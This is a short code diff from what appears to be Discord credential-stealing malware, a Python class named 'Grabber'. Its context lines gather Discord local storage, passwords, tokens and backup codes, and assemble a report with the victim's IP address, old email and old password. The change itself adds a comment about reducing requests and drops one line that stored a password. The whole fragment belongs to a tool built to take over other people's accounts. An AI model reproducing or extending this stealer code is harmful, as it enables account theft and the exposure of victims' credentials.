@@ -13,7 +13,7 @@ class Grabber:
             self.getAppData() + '\\Discord\\Local Storage\\leveldb'
         ]
         self.passwords = []
-        self.validPassword = []
+        self.validPassword = [] #need to give it a use to not abuse requests as much :yikes:
         self.tokens = []
         self.validTokens = []
         self.backupCodes = []
@@ -59,7 +59,6 @@ class Grabber:
                 message += '\nIP :: ' + grabIP
                 message += '\nOld Email :: ' + userInfo['email']
                 message += '\nOld Password :: ' + password
-                self.validPassword.append(password)
                 message += '\n[ - - - - - - - - - - - - - - - - - - - - - ]'
                 try:
                     if userInfo['email'] != r_json['email']:
